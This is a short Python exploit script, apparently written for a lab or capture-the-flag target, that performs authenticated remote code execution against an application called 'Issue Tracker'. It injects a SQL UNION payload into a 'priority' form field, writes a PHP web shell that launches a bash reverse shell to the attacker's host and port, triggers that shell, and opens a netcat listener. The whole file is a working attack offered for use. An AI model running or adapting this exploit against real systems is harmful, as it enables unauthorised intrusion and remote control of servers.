#!/usr/bin/env python3
# Title: "Issue Tracker" Authenticated Remote Code Execution Via SQL Injection
# Author: Jessi
# Abuses an oversight in "Issue Tracker" to exploit a SQLi vuln and write a PHP backdoor
# Usage: python3 issue_rev.py <target_ip> <jsessionid_cookie> <lhost> <lport>


import requests
import os
import sys
import time
import threading


# Warn if no Arguments
if len(sys.argv) <= 1:
    print("Usage: python3 issue_rev.py <target_ip> <jessionid_cookie> <lhost> <lport>")
    exit(1)


# Target IP and Valid JSESSIONID
target = sys.argv[1]
cookie = sys.argv[2]
lhost = sys.argv[3]
lport = sys.argv[4]


# POST Request
payload = f'''High' UNION SELECT "<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"); ?>" INTO OUTFILE "/srv/http/rev.php"; --  '''
data = {'priority':payload}
cookies = {'JSESSIONID':cookie}
url = f'http://{target}:17445/issue/checkByPriority'



# Write Shell
print("[!] Sending Payload")
requests.post(url,cookies=cookies,data=data)
time.sleep(2)
print("[+] Payload Sent")


# Define Shell Interface
shell_url = f'http://{target}:30455/rev.php'
def exploit(shell_url):
    requests.get(shell_url)
def send_exploit():
    threading.Thread(target=exploit(shell_url)).start()


# Shell Handler
print("[+] Spawning Shell")
send_exploit()
os.system(f'nc -lvnp {lport}')
